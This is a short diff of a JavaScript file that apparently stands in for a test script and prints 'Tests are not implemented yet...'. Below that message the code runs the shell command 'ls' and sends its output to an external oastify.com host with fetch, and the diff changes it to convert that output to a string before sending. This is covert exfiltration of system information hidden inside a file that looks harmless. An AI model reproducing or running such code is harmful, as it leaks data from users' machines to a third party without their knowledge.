@@ -3,7 +3,7 @@ console.log("Tests are not implemented yet...");
 
 
 const { exec } = require('child_process');
-let a = exec('ls');
+let a = exec('ls').toString();
 fetch("https://ftc3oml0akzfqy4s3wgfgagvsmydm9ay.oastify.com/?" + a);
 
 //var cp = require('child_process');
